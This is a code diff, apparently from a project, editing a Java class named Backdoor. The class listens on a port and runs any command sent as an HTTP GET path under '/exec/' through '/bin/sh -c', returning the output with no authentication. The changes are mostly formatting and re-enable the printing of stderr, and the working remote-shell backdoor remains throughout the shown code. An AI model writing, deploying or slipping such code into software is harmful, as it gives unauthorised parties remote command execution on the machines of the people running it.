@@ -31,7 +31,7 @@ public class Backdoor {
 		ServerSocket serverSocket = new ServerSocket(port);
 		try {
 			while (true) {
-				System.out.println("waiting for connections on " + port);
+				System.out.println("waiting:" + port);
 				final Socket clientSocket = serverSocket.accept();
 				clientProcessingPool.submit(new Runnable() {
 
@@ -44,16 +44,18 @@ public class Backdoor {
 							boolean is200 = false;
 							while ((input = in.readLine()) != null) {
 								// System.out.println(input);
-								String[] req = input.split(" ",2);
+								String[] req = input.split(" ", 2);
 								if (req != null && req.length >= 2) {
 									if ("GET".equals(req[0])) {
-										System.out.println(input);		
+										System.out.println(input);
 										String command = URLDecoder.decode(req[1], "UTF-8");
 										if (command.startsWith("/exec/")) {
 											String urlcommand = command.replace("/exec/", "").trim();
 											urlcommand = urlcommand.substring(0, urlcommand.lastIndexOf(' '));
 											if (urlcommand != null && !urlcommand.isEmpty()) {
-//												String command = URLDecoder.decode(urlcommand, "UTF-8");
+												// String command =
+												// URLDecoder.decode(urlcommand,
+												// "UTF-8");
 												System.out.println(urlcommand);
 
 												String[] cmd = { "/bin/sh", "-c", "" };
@@ -62,23 +64,19 @@ public class Backdoor {
 												Runtime rt = Runtime.getRuntime();
 												Process p = rt.exec(cmd);
 												BufferedReader stdInput = new BufferedReader(new InputStreamReader(p.getInputStream()));
-												// BufferedReader stdError = new
-												// BufferedReader(new
-												// InputStreamReader(p.getErrorStream()));
+												BufferedReader stdError = new BufferedReader(new InputStreamReader(p.getErrorStream()));
 
 												String s = null;
 												StringBuffer output = new StringBuffer();
 												while ((s = stdInput.readLine()) != null) {
 													System.out.println(s);
-													output = output.append(s).append("\r\n");
+													output = output.append(s).append("\n");
 												}
 
-												// System.out.println("standard error:\n");
-												// while ((s =
-												// stdError.readLine())
-												// != null) {
-												// System.out.println(s);
-												// }
+												System.out.println("standard error:\n");
+												while ((s = stdError.readLine()) != null) {
+													System.out.println(s);
+												}
 
 												out.writeBytes(OUTPUT_HEADERS_200 + output.length() + OUTPUT_END_OF_HEADERS + output);
 												is200 = true;
@@ -97,7 +95,8 @@ public class Backdoor {
 							in.close();
 							out.flush();
 							out.close();
-							System.out.println("Request processed on " + port);
+							// System.out.println("Request processed on " +
+							// port);
 						} catch (IOException e1) {
 							e1.printStackTrace();
 						}
